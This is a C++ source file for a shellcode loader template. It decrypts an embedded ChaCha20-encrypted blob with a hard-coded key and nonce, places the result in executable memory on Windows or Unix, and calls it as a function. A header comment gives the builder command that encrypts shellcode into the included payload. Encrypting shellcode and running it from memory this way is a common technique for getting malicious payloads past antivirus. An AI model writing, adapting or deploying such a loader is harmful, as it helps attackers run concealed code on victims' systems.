/*
 * chacha20_loader.cpp - ChaCha20 shellcode loader template
 * ========================================================
 * Decrypts an embedded ChaCha20 blob (32 B key, 8 B nonce, length-
 * preserving stream) and executes it as a function.
 *
 * Build-time parameters (see payloads/chacha20_300b.meta.json):
 *   key   : 000102030405060708090a0b0c0d0e0f101112131415161718191a1b1c1d1e1f (32 B)
 *   nonce : 0001020304050607 (8 B)
 *
 * State layout matches pycryptodome with an 8-byte nonce (verified):
 *   words 0-3   constants "expand 32-byte k"
 *   words 4-11  key (LE)
 *   words 12-13 64-bit block counter (LE), starts at 0
 *   words 14-15 nonce (LE)
 *
 * Regenerate the payload include with the builder:
 *   shellcrypt.py -i shellcode.bin -m chacha20 --key-hex -k 0001...1e1f \
 *       --nonce 0001020304050607 --verify --meta params.json -f c -o payload_inc.h
 *
 * Compile: g++ -O2 -Wall -o chacha20_loader chacha20_loader.cpp
 */
#include <cstdint>
#include <cstdio>
#include <cstring>

#ifdef _WIN32
#include <windows.h>
#else
#include <sys/mman.h>
#include <unistd.h>
#endif

#include "payload_inc.h" /* kEncrypted[], kEncryptedLen, kOriginalLen */

static const uint8_t kKey[32] = {
    0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
    0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f,
    0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17,
    0x18, 0x19, 0x1a, 0x1b, 0x1c, 0x1d, 0x1e, 0x1f
};
static const uint8_t kNonce[8] = {0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07};

static uint32_t rotl32(uint32_t x, unsigned n) { return (x << n) | (x >> (32 - n)); }

static void chacha20_block(uint64_t ctr, const uint8_t key[32], const uint8_t nonce[8],
                           uint8_t out[64]) {
    static const uint32_t c[4] = {0x61707865, 0x3320646e, 0x79622d32, 0x6b206574};
    uint32_t st[16], ws[16];
    for (unsigned i = 0; i < 4; i++) st[i] = c[i];
    for (unsigned i = 0; i < 8; i++)
        st[4 + i] = (uint32_t)key[4 * i] | ((uint32_t)key[4 * i + 1] << 8) |
                    ((uint32_t)key[4 * i + 2] << 16) | ((uint32_t)key[4 * i + 3] << 24);
    st[12] = ctr & 0xffffffffu;
    st[13] = (ctr >> 32) & 0xffffffffu;
    for (unsigned i = 0; i < 2; i++)
        st[14 + i] = (uint32_t)nonce[4 * i] | ((uint32_t)nonce[4 * i + 1] << 8) |
                     ((uint32_t)nonce[4 * i + 2] << 16) | ((uint32_t)nonce[4 * i + 3] << 24);
    memcpy(ws, st, sizeof(st));
    static const unsigned q[8][4] = {
        {0, 4, 8, 12}, {1, 5, 9, 13}, {2, 6, 10, 14}, {3, 7, 11, 15},
        {0, 5, 10, 15}, {1, 6, 11, 12}, {2, 7, 8, 13}, {3, 4, 9, 14}
    };
    for (unsigned r = 0; r < 10; r++) {
        for (unsigned i = 0; i < 8; i++) {
            unsigned a = q[i][0], b = q[i][1], cw = q[i][2], d = q[i][3];
            ws[a] += ws[b];
            ws[d] ^= ws[a]; ws[d] = rotl32(ws[d], 16);
            ws[cw] += ws[d];
            ws[b] ^= ws[cw]; ws[b] = rotl32(ws[b], 12);
            ws[a] += ws[b];
            ws[d] ^= ws[a]; ws[d] = rotl32(ws[d], 8);
            ws[cw] += ws[d];
            ws[b] ^= ws[cw]; ws[b] = rotl32(ws[b], 7);
        }
    }
    for (unsigned i = 0; i < 16; i++) {
        uint32_t v = ws[i] + st[i];
        out[4 * i] = (uint8_t)v;
        out[4 * i + 1] = (uint8_t)(v >> 8);
        out[4 * i + 2] = (uint8_t)(v >> 16);
        out[4 * i + 3] = (uint8_t)(v >> 24);
    }
}

static void chacha20_decrypt(const uint8_t *ct, uint8_t *pt, size_t len) {
    uint8_t ks[64];
    uint64_t ctr = 0;
    for (size_t off = 0; off < len; off += 64) {
        chacha20_block(ctr, kKey, kNonce, ks);
        ctr++;
        size_t n = (len - off < 64) ? (len - off) : 64;
        for (size_t i = 0; i < n; i++) pt[off + i] = ct[off + i] ^ ks[i];
    }
}

static int run_payload(const uint8_t *p, size_t n) {
#ifdef _WIN32
    void *mem = VirtualAlloc(NULL, n, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!mem) { printf("[-] VirtualAlloc failed\n"); return -1; }
#else
    void *mem = mmap(NULL, n, PROT_READ | PROT_WRITE | PROT_EXEC,
                     MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (mem == MAP_FAILED) { printf("[-] mmap failed\n"); return -1; }
#endif
    memcpy(mem, p, n);
    int (*fn)() = (int (*)())mem;
    int r = fn();
#ifdef _WIN32
    VirtualFree(mem, 0, MEM_RELEASE);
#else
    munmap(mem, n);
#endif
    return r;
}

int main(void) {
    static uint8_t plain[4096];
    if (kEncryptedLen > sizeof(plain)) return 1;
    chacha20_decrypt(kEncrypted, plain, kEncryptedLen);
    printf("[+] ChaCha20 decrypted %u bytes\n", kEncryptedLen);
    int r = run_payload(plain, kEncryptedLen);
    printf("[+] payload returned %d\n", r);
    return 0;
}
